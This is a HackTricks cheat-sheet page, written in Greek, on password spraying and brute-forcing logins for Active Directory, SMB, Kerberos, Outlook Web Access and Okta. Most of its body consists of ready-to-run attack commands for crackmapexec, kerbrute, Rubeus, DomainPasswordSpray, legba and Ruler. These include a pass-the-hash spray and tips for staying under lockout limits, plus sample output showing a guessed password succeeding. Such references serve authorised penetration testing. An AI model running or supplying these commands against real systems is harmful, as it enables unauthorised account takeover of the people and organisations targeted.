# Επίθεση με Κατανομή Κωδικών Πρόσβασης / Βίαιη Δοκιμή

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## **Επίθεση με Κατανομή Κωδικών Πρόσβασης**

Αφού βρείτε αρκετά **έγκυρα ονόματα χρηστών** μπορείτε να δοκιμάσετε τους πιο **συνηθισμένους κωδικούς πρόσβασης** (λαμβάνοντας υπόψη την πολιτική κωδικού πρόσβασης του περιβάλλοντος) με κάθε έναν από τους ανακαλυφθέντες χρήστες.\
Από προεπιλογή, το **ελάχιστο μήκος του κωδικού πρόσβασης** είναι **7**.

Λίστες με συνηθισμένα ονόματα χρηστών μπορεί να είναι χρήσιμες επίσης: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Προσέξτε ότι **μπορείτε να κλειδώσετε ορισμένους λογαριασμούς εάν δοκιμάσετε πολλούς λανθασμένους κωδικούς πρόσβασης** (προεπιλογή περισσότερο από 10).

### Λήψη πολιτικής κωδικού πρόσβασης

Εάν έχετε κάποια διαπιστευτήρια χρήστη ή ένα κέλυφος ως χρήστης του τομέα μπορείτε να **λάβετε την πολιτική κωδικού πρόσβασης με**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Εκμετάλλευση από Linux (ή όλα)

* Χρησιμοποιώντας το **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
* Χρησιμοποιώντας το [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
* [**spray**](https://github.com/Greenwolf/Spray) _**(μπορείτε να υποδείξετε τον αριθμό των προσπαθειών για να αποφύγετε το κλείδωμα):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
* Χρησιμοποιώντας το [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - ΔΕΝ ΣΥΣΤΉΝΕΤΑΙ ΠΑΝΤΑ ΔΟΥΛΕΥΕΙ
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
* Με το εργαλείο `scanner/smb/smb_login` του **Metasploit**:

![](<../../.gitbook/assets/image (132) (1).png>)

* Χρησιμοποιώντας το **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Από τα Windows

* Με την έκδοση [Rubeus](https://github.com/Zer1t0/Rubeus) με το brute module:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
* Με το [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Μπορεί να δημιουργήσει χρήστες από τον τομέα από προεπιλογή και θα λάβει την πολιτική κωδικού πρόσβασης από τον τομέα και θα περιορίσει τις προσπάθειες ανάλογα με αυτήν):
```powershell
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
* Με το [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
## Βίαιη Δύναμη

{% code overflow="wrap" %}
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
{% endcode %}

## Outlook Web Access

Υπάρχουν πολλά εργαλεία για το **password spraying στο Outlook**.

* Με το [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/)
* Με το [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/)
* Με το [Ruler](https://github.com/sensepost/ruler) (αξιόπιστο!)
* Με το [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
* Με το [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Για να χρησιμοποιήσετε οποιοδήποτε από αυτά τα εργαλεία, χρειάζεστε μια λίστα χρηστών και έναν κωδικό πρόσβασης / μια μικρή λίστα κωδικών πρόσβασης για να κάνετε spraying.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

* [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

* [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
* [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
* [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Αναφορές

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
* [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
* [www.blackhillsinfosec.com/?p=5296](www.blackhillsinfosec.com/?p=5296)
* [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
